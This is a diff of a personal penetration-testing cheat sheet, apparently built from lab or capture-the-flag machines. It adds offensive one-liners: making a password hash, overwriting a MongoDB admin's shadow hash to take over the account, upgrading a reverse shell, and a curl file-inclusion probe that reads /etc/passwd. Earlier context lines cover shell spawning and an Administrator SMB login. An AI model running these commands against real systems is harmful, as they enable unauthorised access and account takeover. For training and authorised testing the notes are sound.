@@ -22,6 +22,9 @@ netCat for windows:
 Monitor local tcp ports:
 sudo tcpdump -i tun0 port 389
 
+make new password hash:
+mkpasswd -m sha-512 Password1234
+
  start up a nice shell:
     python3 -c 'import pty;pty.spawn("/bin/bash")'
  reverseshell
@@ -32,6 +35,7 @@ sudo tcpdump -i tun0 port 389
     stty raw -echo
     fg
     export TERM=xterm
+More upgrades on revers term = script /dev/null -c bash
 
  smbclient  \\\\10.10.10.131\\ADMIN$ -U Administrator
 
@@ -51,6 +55,8 @@ not be run against a target network without permission.
 
 Mongo DB connection:
 ./mongosh mongodb://{target_IP}:27017
+replace password:
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$m9rY746GGNTuW4Ho$1l8UixBipvZHiPjavsIUGJOqrOywe0esTC0WZi7o8eKvtHKAjrGpF95RWrfSG2v6XmbL001z6kNqXQCwxr8Ai1"}})'
 
 
 Enumeration serch tools:
@@ -86,6 +92,8 @@ C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline
 Availabel Users:
 cat /etc/passwd
 
+File inclusion check:
+curl 'http://{target_IP}/?file=/etc/passwd'
 
 Redis connect:
 redis-cli -h {target_ip}
